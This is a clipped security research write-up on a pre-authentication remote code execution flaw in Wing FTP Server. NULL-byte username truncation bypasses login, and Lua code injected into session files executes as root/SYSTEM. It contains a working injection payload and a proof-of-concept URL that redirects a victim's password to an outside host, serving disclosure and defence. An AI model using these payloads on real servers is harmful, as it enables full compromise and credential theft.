---
title: What the NULL?! Pre-Auth Wing FTP Server RCE … | RCE Security
source: https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/
source_host: www.rcesecurity.com
clip_date: 2026-09-28T10:16:42+08:00
trace_id: e2b2dc89-7ecc-426b-995c-e724fa2bea30
content_hash: c9d778904e1f51338da6351fd4e29db45145510ae0e5c8cf65d3b7c5cd578b62
status: synced
tags:
  - 漏洞分析
  - Web安全
series: null
feed_source: RCE Security·漏洞研究
ai_summary: Wing FTP Server 存在 NULL 字节用户名截断认证绕过，进而可向会话文件注入 Lua 代码，实现以 root/SYSTEM 权限的预认证远程代码执行。
ai_summary_style: key-points
images_status:
  total: 14
  succeeded: 14
  failed_urls: []
notion_page_id: 3e975244-d011-8119-a257-d672ae73da0e
ioc:
  cves:
    - CVE-2025-27889
    - CVE-2025-47811
    - CVE-2025-47813
  cwes: []
  hashes:
    - f528764d624db129b32c21fbca0cb8d6
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Wing FTP Server 存在 NULL 字节用户名截断认证绕过，进而可向会话文件注入 Lua 代码，实现以 root/SYSTEM 权限的预认证远程代码执行。
> 
> - **漏洞根因：** Lua 层 `c_CheckUser()` 校验收到的用户名，但二进制中的 `CStdStr` 构造经 `std::string::assign` 调用 `strlen()`，在 NULL 字节处截断；只要 NULL 前是已存在用户名即通过认证，且返回给 Lua 的是含 NULL 及后续内容的完整字符串。
> - **利用链第一步：** 登录成功后 `loginok.html` 把原始用户名写入 `_SESSION`，`SessionModule.save()` 将其序列化成 Lua 脚本形式的会话文件，`]]` + 换行 + `io.popen("id")` 等payload 可注入任意 Lua 代码。
> - **触发方式：** `SessionModule.load()` 对有效会话文件调用 `loadfile()` 并直接 `f()` 执行，访问 `/dir.html` 等任意已认证端点即可触发 RCE。
> - **影响范围：** Linux 下 wftpserver 默认以 root 运行、Windows 下以 SYSTEM 运行，无降权与沙箱；任意拥有有效凭证的账户均可利用，不限于匿名账户。
> - **相关 CVE 与修复：** CVE-2025-27889（`downloadpass.html` 的 url 参数导致密码泄露）、CVE-2025-47811（默认 root/SYSTEM 的高权限服务，厂商未修）、CVE-2025-47813（超长 UID Cookie 泄露本地路径）；除 47811 外均在 7.4.4 修复。

While performing a penetration test for one of our Continuous Penetration Testing customers, we’ve found a Wing FTP server instance that allowed anonymous connections. It was almost the only interesting thing exposed, but we still wanted to get a foothold into their perimeter and provide the customer with an impactful finding. So we unboxed our Binary Ninja and started digging. Spoiler: We ended up getting remote code execution as root.

## Good Old Anonymous!

So we came across Wing FTP’s web interface that apparently allowed anonymous logins. In the case of Wing FTP, the anonymous user on the web interface is the same as used in the FTP protocol.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/62eab55210cbf737.png)

After authentication (well, anonymous connections can be considered unauthenticated since it doesn’t require any password at all), we weren’t able to do much, apart from downloading some static public content. But great, we at least have read permissions. What you normally do in this situation is fuzzing for other user accounts that might have a weaker, easy to guess password. However, we weren’t super lucky since all of them simply returned a “Login failed” error message:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/982bdedfd8105672.png)

We almost gave up, until we noticed a particularly interesting pattern:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f675930a6cdd3535.png)

So appending a NULL byte to the username followed by any random string doesn’t seem to trigger an authentication failure, which is what you’d expect normally. Instead, it seems to still successfully authenticate the user. Besides the missing error message, the other indicator for a successful authentication is the `UID` cookie, which is Wing FTP’s primary authentication cookie for the user web interface. This triggered us quite hard, especially since this behaviour is observable across the entire web interface and even the administrative web interface.

## Strlen() vs NULL

Exploring this black box is almost impossible, so we started setting up our Wing FTP server instance to debug what was going on, since it kind of smelled like there’s something juicy hidden here. When having a look at the `loginok.html` file which handles the authentication process, you’ll get the following code:

```lua
local username = _GET["username"] or _POST["username"] or ""
local password = _GET["password"] or _POST["password"] or ""
local remember = _GET["remember"] or _POST["remember"] or ""
local redir = _GET["redir"] or _POST["redir"] or ""
local lang = _GET["lang"] or _POST["lang"] or ""

username = string.gsub(username,"+"," ")
username = string.gsub(username,"\t","+")
password = string.gsub(password,"+"," ")
password = string.gsub(password,"\t","+")

local result = c_CheckUser(username,password)
if result ~= OK_CHECK_CONNECTION then
	c_AddWebLog("User '"..string.sub(username, 1, 64).."' login failed! (IP:".._REMOTE_IP..")","0",DOMAIN_LOG_WEB_RESPOND)
	print("<script>alert('"..LOGINERROR_STR[tonumber(result)].."');location='login.html';</script>")
```

So there isn’t a lot of filtering happening at all up to the point when we hit the `c_CheckUser()` call on line 13 which is supposed to verify the username/password combination. While debugging exactly this line, we noticed that `c_CheckUser` always returns `OK_CHECK_CONNECTION` regardless of what comes after the NULL byte in the username, as long as the string before the NULL byte matches an existing user. Since `c_CheckUser()` is implemented in the Wing FTP’s main binary `wftpserver`, we set up our remote debug server and attached our favourite debugger, Binary Ninja, to it to find out what was going on here. Here’s what we noticed:

Quite early in `c_CheckUser()`, the application fetches the username using a `lua_tolstring` call (which ignores the NULL-byte) and passes the resulting string to a `CStdStr` constructor:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4095e2f9ec4ec25b.png)

When tracing the constructor actions further down the line, we will eventually end up in a function called `ssasn(std::string& arg1, char const* arg2)` which will call `std::string:assign` on our username, which still has the NULL-byte included:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5a32b6d08109a764.png)

Now `std::string:assign` internally uses `strlen()` on our username to get the string size, but `strlen` only counts all the characters until it reaches the NULL-byte terminator. This is why the RAX register contains 0x9 which is precisely the length of the username “anonymous”:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/dc6bee45a4de51c7.png)

This, in return, means that the `CStdStr` constructor will work with only the first part of the username string up to the NULL-byte that we have injected as part of the username. Since it only takes the first part, the call to `CUserManager::CheckUser` will also only work with the first part of the username, ultimately allowing us to pass the authentication check with any string as long as an existing username comes before the NULL byte:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/860b7b237988c78b.png)

## Why the heck is this interesting?!?

So, remember that `c_CheckUser` in the Lua code performs the authentication check: If we have a look a little further down the code in `loginok.html` to inspect how the sessions are generated, you’ll notice this:

```lua
local username = _GET["username"] or _POST["username"] or ""
local password = _GET["password"] or _POST["password"] or ""
local remember = _GET["remember"] or _POST["remember"] or ""
local redir = _GET["redir"] or _POST["redir"] or ""
local lang = _GET["lang"] or _POST["lang"] or ""

username = string.gsub(username,"+"," ")
username = string.gsub(username,"\t","+")
password = string.gsub(password,"+"," ")
password = string.gsub(password,"\t","+")

local result = c_CheckUser(username,password)
if result ~= OK_CHECK_CONNECTION then
    c_AddWebLog("User '"..string.sub(username, 1, 64).."' login failed! (IP:".._REMOTE_IP..")","0",DOMAIN_LOG_WEB_RESPOND)
    print("<script>alert('"..LOGINERROR_STR[tonumber(result)].."');location='login.html';</script>")
else
    if _COOKIE["UID"] ~= nil then
        _SESSION_ID = _COOKIE["UID"]
        local retval = SessionModule.load(_SESSION_ID)
        if retval == false then
            _SESSION_ID = SessionModule.new()
            if _UseSSL == true then
                _SETCOOKIE = _SETCOOKIE.."Set-Cookie: UID=".._SESSION_ID.."; HttpOnly; Secure\r\n"
            else
                _SETCOOKIE = _SETCOOKIE.."Set-Cookie: UID=".._SESSION_ID.."; HttpOnly\r\n"
            end
            rawset(_COOKIE,"UID",_SESSION_ID)
        end
    else
        _SESSION_ID = SessionModule.new()
        if _UseSSL == true then
            _SETCOOKIE = _SETCOOKIE.."Set-Cookie: UID=".._SESSION_ID.."; HttpOnly; Secure\r\n"
        else
            _SETCOOKIE = _SETCOOKIE.."Set-Cookie: UID=".._SESSION_ID.."; HttpOnly\r\n"
        end
        rawset(_COOKIE,"UID",_SESSION_ID)
    end

    if package.config:sub(1,1) == "\\" then
        username = string.lower(username)
    end
    rawset(_SESSION,"username",username)
    rawset(_SESSION,"ipaddress",_REMOTE_IP)
    SessionModule.save(_SESSION_ID)
```

So what happens here is the application works with the username in the `rawset()` call on line 43 that is directly sourced from the GET or POST parameter on line 1. And this is the full username, including NULL byte and whatever comes after it. This is because `c_CheckUser()` does not return a sanitized username, but only the authentication state.

On line 45, the application then calls `SessionModule.save()` which is defined as follows:

```php
function save (id)
	if not check_id (id) then
		return nil, INVALID_SESSION_ID
	end

	if isfolder(root_dir) == false then
		mkdir(root_dir)
		chmod(root_dir, "0600")
	end

	local fh = assert(_open(filename (id), "w+"))
	serialize(_SESSION, function (s) fh:write(s) end)
	fh:close()
	chmod(filename(id), "0600")
end
```

Here, the application creates a new session file on line 11, and afterwards serializes everything from `_SESSION` which includes our username into the session file. `serialize()` looks like this:

```lua
function serialize(tab,outf)
    if type(tab) == "table" then
        for k,v in pairs(tab) do
            if type(k) == "string" then k="'"..k.."'" end
            if(type(v) == "string") then
                outf("_SESSION["..k.."]=[["..v.."]]\r\n")
            elseif(type(v) == "number") then
                outf("_SESSION["..k.."]="..v.."\r\n")
            elseif(type(v) == "function") then
                outf("_SESSION["..k.."]=\"[function]\"\r\n")
            elseif(type(v) == "nil") then
                outf("_SESSION["..k.."]=nil\r\n")
            else
                outf("_SESSION["..k.."]={")
                serialize(v,outf)
                outf("}\r\n")
            end
        end
    end
end
```

You might have an idea where this is leading to. But let’s have a closer look at those session files.

## Lua Code Injection into Session Files

When you authenticate against the web interface with our NULL-byte injected username, the application creates a new session ID indicated by the `UID` session cookie:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/353b1f5cbe9ca4b7.png)

When having a look at the wftpserver/session directory, you can notice that these session files are essentially Lua script files. The intention of these is to store only session variables, but since the loginok.html file works with the entire string, the NULL byte gets actually stored in the Session variable as well:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0693560d9171f356.png)

So what could possible go wrong with a username like this?

```powershell
anonymous%00]]%0dlocal+h+%3d+io.popen("id")%0dlocal+r+%3d+h%3aread("*a")%0dh%3aclose()%0dprint(r)%0d--
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5b0e7116627d539a.png)

This injects Lua code into the session file (also: nano FTW):

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/60aba127a7b3bad6.png)

## Triggering the Code Injection

We do have our injected Lua code in the session file, but how do we execute it? It is as easy as it sounds: the session file gets executed whenever it is used. The reason can be found in `SessionModule.lua`:

```lua
function load (id)
	if not check_id (id) then
		return false
	end

	local filepath = filename(id)
	if fileexist(filepath) then
		if filetime(filepath) + timeout < time() then
			remove(filepath)
			return false
		end

		local ipHash = string.sub(id, -32)
		if c_RestrictSessionIP() == true and ipHash ~= md5(_REMOTE_IP) then
			return false
		end

		if ipHash == "f528764d624db129b32c21fbca0cb8d6" and _REMOTE_IP ~= "127.0.0.1" then
			return false
		end

		local f, err = loadfile(filepath)
		if not f then
			return false
		else
			f()
			return true
		end

	end
end
```

If the session ID is valid, the session file is loaded on line 22 and directly executed on line 26. So after injecting the Lua code into the session file, whose name is essentially the value of the UID cookie, you only need to call any of the authenticated functionalities that are available through the Wing FTP web interface, such as reading the directory contents using the `/dir.html` endpoint:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1b6f0be136ca5482.png)

This gives us Remote Code Execution on the server. But it does not end here. As you can see in the screenshot, the code is executed using root-rights on Linux because wftpserver runs using root-level rights by default. There is no dropping of rights, no jailing, or sandboxing (see also CVE-2025-47811).

On a side note: the Windows version of Wing FTP server is started using NT AUTHORITY/SYSTEM rights by default, which is why you will end up with a SYSTEM rights RCE on Microsoft Windows.

At this point, we’ve achieved what we wanted: Going from an anonymous read-only account to full code execution as root. And just to clarify: this isn’t just exploitable using the Anonymous account, but with any user account as long as you have valid credentials.

## Update: Leaking a User’s Password (CVE-2025-27889)

We believe that another disclosure went a little under the radar, but could become quite useful if you want to exploit this RCE, but don’t have a user’s password: **[CVE-2025-27889](https://github.com/MrTuxracer/advisories/blob/master/CVEs/CVE-2025-27889.txt)**

A simple PoC looks like this:

```
/downloadpass.html?url=//rcesecurity.com/file%3fdownload%26weblink%3drcesec
```

This basically sets the location variable within the `ch()` function:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fc07b02bef0c9e8d.png)

The `ch()` function in return is called when you click the submit button. (Un)fortunately, the application also appends the entered password to the location variable, which basically means you can leak it to any destination once you can convince the victim to enter their password and submit the form:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4ba2857cf0ec32bf.png)

## Two More (minor) Bugs Affecting Wing FTP Server

[CVE-2025-47811](https://github.com/MrTuxracer/advisories/blob/master/CVEs/CVE-2025-47811.txt): Overly Permissive Service running with Root/SYSTEM by default

[CVE-2025-47813](https://github.com/MrTuxracer/advisories/blob/master/CVEs/CVE-2025-47813.txt): Local Path Disclosure Through Overlong UID Cookie

## Remediation

All reported bugs have been fixed in version 7.4.4 of Wing FTP, except for CVE-2025-47811, which the vendor thinks is fine to keep despite being the reason why we got full root access.

Stay curious.
